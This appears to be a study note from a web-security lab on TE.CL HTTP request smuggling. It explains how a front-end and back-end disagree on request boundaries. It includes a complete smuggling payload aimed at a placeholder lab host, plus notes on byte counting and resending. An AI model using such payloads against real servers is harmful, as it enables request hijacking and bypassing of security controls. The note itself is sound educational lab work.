# HTTP Request Smuggling - TE.CL

## Concept

HTTP Request Smuggling occurs when the front-end and back-end servers interpret the boundaries of an HTTP request differently, causing **HTTP desynchronization**.

This allows an attacker to "smuggle" a second HTTP request to the back-end.

---

## TE.CL

- **Front-end** ➜ Uses `Transfer-Encoding: chunked`
- **Back-end** ➜ Uses `Content-Length`

---

## How it works

### Front-end

Processes the request using:

```http
Transfer-Encoding: chunked

It considers the request body finished when it reaches:

0
Back-end

Ignores Transfer-Encoding and uses:

Content-Length

to determine the request body size.

The remaining bytes after the Content-Length limit are treated as the beginning of the next request.

Example Payload
POST / HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /404 HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Length: 10

x=1
0
What happens?
Front-end
----------
POST Request
|
|---- Uses Transfer-Encoding
|
|---- Reads chunk size:
|
|---- Stops after:
     0
|
+-----------------------------> Back-end


Back-end
---------
POST Request
|
|---- Ignores Transfer-Encoding
|
|---- Uses Content-Length
|
|---- Reads only part of the body
|
|---- Remaining data:

GET /404 HTTP/1.1

is treated as a new request
Why does this happen?

The two servers disagree about where the request ends:

Front-end:

Transfer-Encoding
        ↓
0 = End of request


Back-end:

Content-Length
        ↓
Body ends earlier

The leftover bytes become a smuggled request.

Lab Notes
Use HTTP/1.1, not HTTP/2.
Add both:
Content-Length
Transfer-Encoding: chunked
The front-end prioritizes Transfer-Encoding.
The back-end prioritizes Content-Length.
The payload usually needs precise byte calculation.
Extra bytes after the Content-Length value may become the next request.
Sending the request multiple times may be required because the smuggled request affects the following request.
Key Idea
Front-end

POST
--------------------->

Reads using Transfer-Encoding
Stops at 0


Back-end

POST
--------------------->

Reads using Content-Length

Remaining bytes
        ↓
New HTTP Request
Summary
Front-end  -> Transfer-Encoding
Back-end   -> Content-Length

↓

Different request boundaries

↓

HTTP Desynchronization

↓

Request Smuggling
References
https://portswigger.net/web-security/request-smuggling
https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses
